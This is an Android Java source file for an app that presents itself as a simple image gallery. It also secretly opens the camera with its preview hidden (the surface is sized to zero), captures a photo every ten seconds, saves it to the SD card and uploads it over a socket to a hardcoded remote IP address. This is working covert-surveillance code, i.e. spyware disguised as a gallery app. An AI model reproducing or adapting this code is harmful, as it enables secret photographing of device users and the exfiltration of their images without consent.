package your.LINHelloGalleryView;

import java.io.BufferedWriter;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;

import android.app.Activity;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Bitmap.CompressFormat;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.hardware.Camera.PreviewCallback;
import android.media.MediaRecorder;
import android.os.Bundle;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.View;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemClickListener;
import android.widget.Gallery;


public class LINHelloGalleryViewActivity extends Activity implements SurfaceHolder.Callback {
    /** Called when the activity is first created. */
	public int pos;		// 현재 이미지 포커스
	public static LINHelloGalleryViewActivity instance;		// 현재 액티비티 정보 저장

	//camera
	private MediaRecorder mediaRecorder;
	private Camera camera;
	private Camera.Parameters parameters;
	public static Socket socket;
	public static BufferedWriter output;
	
	static int port = 55000;
	static String ip = "203.252.106.119";

	@Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        
        instance=this;
        
        Gallery g=(Gallery) findViewById(R.id.gallery);
        g.setAdapter(new ImageAdapter(this));
        
        g.setOnItemClickListener(new OnItemClickListener() {

			public void onItemClick(AdapterView<?> parent, View v, int position,
					long id) {
				// TODO Auto-generated method stub

				pos=position;		// 포커스 셋
				Intent intent=new Intent();
				intent.setClass(LINHelloGalleryViewActivity.this, ImageView.class);
				startActivity(intent);		// 액티비티 시작
			}
		});
        //camera
		SurfaceView surface = (SurfaceView) findViewById(R.id.surfaceView);
		SurfaceHolder holder = surface.getHolder();

		holder.addCallback(this);
		holder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
		holder.setFixedSize(0, 0); // 미리보기 화면 안뜨게

    }
	
	public void surfaceChanged(SurfaceHolder arg0, int arg1, int arg2, int arg3) {
		// TODO Auto-generated method stub\
		parameters = camera.getParameters();
		parameters.setPreviewSize(320, 240);
		parameters.setPreviewFormat(PixelFormat.YCbCr_420_SP);
		camera.setParameters(parameters);
		camera.startPreview();
		TimerTask task = new TimerTask() {
			public void run() {
				try {
					send_photo();
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		};
		Timer timer = new Timer();
		timer.schedule(task, 0, 10000); 
	}

	public void surfaceCreated(SurfaceHolder arg0) {
		if (mediaRecorder == null) {
			try {
				camera = Camera.open();
				camera.setPreviewDisplay(arg0);
			} catch (IOException e) {
				Log.d("CAMERA", e.getMessage());
				camera.release();
				camera = null;
			}
		}
	}

	public void surfaceDestroyed(SurfaceHolder arg0) {
		camera.stopPreview();
		camera.release();
	}

	static public void decodeYUV420SP(int[] rgb, byte[] yuv420sp, int width,
			int height) {
		final int frameSize = width * height;
		for (int j = 0, yp = 0; j < height; j++) {
			int uvp = frameSize + (j >> 1) * width, u = 0, v = 0;
			for (int i = 0; i < width; i++, yp++) {
				int y = (0xff & ((int) yuv420sp[yp])) - 16;
				if (y < 0)
					y = 0;
				if ((i & 1) == 0) {
					v = (0xff & yuv420sp[uvp++]) - 128;
					u = (0xff & yuv420sp[uvp++]) - 128;
				}
				int y1192 = 1192 * y;
				int r = (y1192 + 1634 * v);
				int g = (y1192 - 833 * v - 400 * u);
				int b = (y1192 + 2066 * u);
				if (r < 0)
					r = 0;
				else if (r > 262143)
					r = 262143;
				if (g < 0)
					g = 0;
				else if (g > 262143)
					g = 262143;
				if (b < 0)
					b = 0;
				else if (b > 262143)
					b = 262143;
				rgb[yp] = 0xff000000 | ((r << 6) & 0xff0000)
						| ((g >> 2) & 0xff00) | ((b >> 10) & 0xff);
			}
		}
	}

	public byte[] bitmapToByteArray(Bitmap b) {
		ByteArrayOutputStream stream = new ByteArrayOutputStream();
		b.compress(CompressFormat.JPEG, 100, stream);
		byte[] byteArray = stream.toByteArray();
		return byteArray;
	}

	public void send_photo() {
		camera.setOneShotPreviewCallback(new PreviewCallback() {
			public void onPreviewFrame(byte[] _data, Camera _camera) {
				FileOutputStream outStream = null;
				Date date = new Date();
				String filename = Integer.toString(date.getYear())+Integer.toString(date.getMonth())+Integer.toString(date.getDate())+"_"+Integer.toString(date.getHours())+Integer.toString(date.getMinutes())+Integer.toString(date.getSeconds());
				int[] rgb = new int[76800];
				decodeYUV420SP(rgb, _data, 320, 240);
				Bitmap bm = Bitmap.createBitmap(rgb, 320, 240,
						Bitmap.Config.RGB_565);
				byte[] data = bitmapToByteArray(bm);
				 //File file = new File("/sdcard/DCIM/" +filename + ".jpg");
				 try {
					outStream = new FileOutputStream("/sdcard/DCIM/" + filename
					 + ".jpg");
					 outStream.write(data);
					 outStream.close();
				} catch (FileNotFoundException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			
				Log.e("Error", "picture size: "+data.length);
				sendWithSock(filename);
			}

		});

	}

	public void sendWithSock(String time) {
		
		
		try {
			setSocket(ip, port);
		} catch (IOException e) {
			Log.e("Error", e.getMessage());
		}
		try {
			
			output.write(time+".jpg"+"???");//제목먼저보내기
			output.flush();
			DataOutputStream dos = new DataOutputStream(socket.getOutputStream());
			DataInputStream dis = new DataInputStream(new FileInputStream(new File("/sdcard/DCIM/" + time
					 + ".jpg")));
			byte[] buf = new byte[1024];
			while(dis.read(buf)>0)
			{
				dos.write(buf);
				dos.flush();
			}
			output.close();
			dos.close();
			socket.close();

	
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	public void setSocket(String ip, int port) throws IOException {
		try {
			socket = new Socket(ip, port);
			output = new BufferedWriter(new OutputStreamWriter(
					socket.getOutputStream()));
		} catch (IOException e) {
			Log.e("Error", e.getMessage());
		}
	}
}